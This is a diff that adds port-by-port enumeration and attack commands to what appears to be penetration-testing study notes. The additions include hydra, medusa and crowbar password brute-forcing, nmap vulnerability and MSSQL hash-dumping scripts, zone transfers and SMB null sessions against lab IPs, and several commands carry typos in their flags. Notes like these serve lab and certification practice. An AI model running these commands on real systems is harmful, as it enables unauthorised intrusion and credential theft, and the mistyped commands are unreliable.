@@ -117,11 +117,17 @@ Banner grab for version. Several clients are directly exploit.
 
 `ftp`: often allows anonymous login, which depending on allowed directories can disclose information, allow us to upload a reverse shell to web root, add a schedule task, etc.
 
+`hydra -L USER_LIST -P PASS_LIST -f -o phydra.txt -u 10.10.10.10 -s 21 ftp`
+
+`nmap -sV -Pn -vv -21 --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -oN nmap-ftp 10.10.10.10`
+
 #### 22: SSH
 
 Banner grab for version. Some are directly exploitable, others allow user enumeration.
 
 `auxiliary/scanner/ssh/ssh_enumusers`
+
+`medusa -u root -P /usr/share/wordlists/rockyou.txt -e ns -h 10.10.10.10 - 22 -M ssh`
 
 #### 23: Telnet
 
@@ -139,6 +145,10 @@ Server to server Simple Mail Transfer Protocol. Can not read mail, but can send 
 
 `auxiliary/scanner/smtp/smtp_enum`
 
+#### 53: DNS
+
+`dnsrecon -t axfr -d 10.10.10.10`
+
 #### 69: TFTP
 
 FTP over UDP. Has exploitable clients, may allow anonymous access.
@@ -148,6 +158,10 @@ FTP over UDP. Has exploitable clients, may allow anonymous access.
 `nikto`
 
 `gobuster`
+
+Check /robots.txt
+
+`VHostScan`
 
 #### 88: Kerberos
 
@@ -185,11 +199,23 @@ Microsoft's RPC Port. RPCs can be made over raw TCP as well as over SMB. `PSExec
 
 `ms03_026_dcom`
 
+`rpcclient -U \"\" 10.10.10.10`
+
 #### 137/8?: Netbios
 
 Allows communication between applications such as printer or other computer in Ethernet or token ring network via NETBIOS name. 
 NETBIOS name is 16 digits long character assign to a computer in workgroup by WINS for name resolution of an IP address into NETBIOS name. 
 To retrieve NETBIOS name: `nbstat` request over UDP/137, if possible, or check the DNS name. 
+
+`nmblookup -A 10.10.10.10`
+
+`smbclient //MOUNT/share -I 10.10.10.10 N`
+
+`smbclient -L //10.10.10.10`
+
+`enum4linux -a 10.10.10.10`
+
+`rpcclient -U \"\" 10.10.10.10`
 
 #### 139/445: SMB/Samba
 
@@ -215,6 +241,10 @@ Servers running SMB are often vulnerable to MS17-010
 
 `nmblookup`
 
+`nmap -sV -Pn -vv -p 139,$port --script=smb-vuln* --script-args=unsafe=1 -oN nmap-smb-vuln 10.10.10.10`
+
+`nmap -sV -Pn -vv -p $port --script=smb-enum-users -on nmap-smb-enum-users 10.10.10.10`
+
 #### 143/993: IMAP
 
 #### 161/162: SNMP
@@ -226,6 +256,8 @@ Servers running SMB are often vulnerable to MS17-010
 `snmpbulkwalk`
 
 `snmp-check -t 192.168.1.101 -c public`
+
+`"nmap -sV -Pn -vv -p161 --script=snmp-netstat,snmp-processes -on nmap-snmp 10.10.10.1.`
 
 #### 389/636: Ldap
 
@@ -296,6 +328,8 @@ If you get this error, the server is set up to only allow login from 127.0.0.1, 
 
 A file in the web root often has the creds for the database.
 
+`nmap -vv -sV -Pn -p 3306 --script=ms-sql-info,ms-sql-config,ms-sql-dump-hashes --script-args=mssql.instance-port=$port,smsql.username-sa,mssql.password-sa -oA $outputdir/$ip_$port_mssql_nmap_scan 10.10.10.10`
+
 #### 3389: Remote Desktop Protocol
 
 `rdesktop -u guest -p guest 10.11.1.5 -g 94%`
@@ -315,6 +349,8 @@ Ms12-020 comes up in searches but there is no POC code, don't waste time.
 `use auxiliary/scanner/vnc/vnc_login` bruteforce
 
 `use auxiliary/scanner/vnc/vnc_none_auth`
+
+`crowbar -b vnckey -s 10.10.10.10/32 -p IP -k PASS_FILE`
 
 #### 8080: Common/Various
 
